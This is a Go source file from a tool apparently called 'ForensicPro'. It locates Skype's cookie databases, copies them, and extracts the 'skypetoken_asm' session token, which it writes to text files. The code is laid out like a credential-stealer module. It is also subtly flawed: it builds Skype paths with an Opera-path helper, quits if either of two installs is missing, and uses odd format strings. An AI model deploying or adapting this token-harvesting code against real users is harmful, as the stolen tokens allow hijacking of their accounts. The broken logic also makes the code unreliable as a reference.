package Messengers

import (
	"ForensicPro/utils"
	"database/sql"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

const MessengerName = "Skype"

var MessengerPaths = []string{
	utils.GetOperaPath("Microsoft\\Skype for Desktop"),
	utils.GetLocalAppDataPath("Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store"),
}

func SkypeCookies(messengerPath string) (string, error) {
	var sb strings.Builder
	cookiePath := filepath.Join(messengerPath, "Network", "Cookies")

	if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
		return "", nil
	}

	tempFileName, err := ioutil.TempFile("", "skype_cookies_*.db")
	if err != nil {
		return "", err
	}
	defer os.Remove(tempFileName.Name())

	if err := utils.CopyFile(cookiePath, tempFileName.Name()); err != nil {
		return "", err
	}

	db, err := sql.Open("sqlite3", tempFileName.Name())
	if err != nil {
		return "", err
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, value FROM cookies")
	if err != nil {
		return "", err
	}
	defer rows.Close()

	for rows.Next() {
		var hostKey, name, value string
		if err := rows.Scan(&hostKey, &name, &value); err != nil {
			return "", err
		}
		if name == "skypetoken_asm" {
			sb.WriteString(fmt.Sprintf("{hostKey}={%s}\n", hostKey))
			sb.WriteString(fmt.Sprintf("{name}={%s}\n", name))
			sb.WriteString(fmt.Sprintf("{skypetoken}={%s}\n", value))
		}
	}

	return sb.String(), nil
}

func SkypeSave(path string) {
	if _, err := os.Stat(MessengerPaths[0]); err != nil {
		return
	}
	if _, err := os.Stat(MessengerPaths[1]); err != nil {
		return
	}

	text, err := SkypeCookies(MessengerPaths[0])
	if err != nil {
		return
	}
	text2, err := SkypeCookies(MessengerPaths[1])
	if err != nil {
		return
	}

	if text == "" && text2 == "" {
		return
	}

	targetPath := filepath.Join(path, MessengerName)
	if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
		log.Fatalf("创建目录失败: %v", err)
	}

	if text != "" {
		err := utils.WriteToFile(text, targetPath+"\\_Desktop.txt")
		if err != nil {
			return
		}
	}

	if text2 != "" {
		err := utils.WriteToFile(text2, targetPath+"\\_Store.txt")
		if err != nil {
			return
		}
	}
	fmt.Println("Skype 取证结束")
}
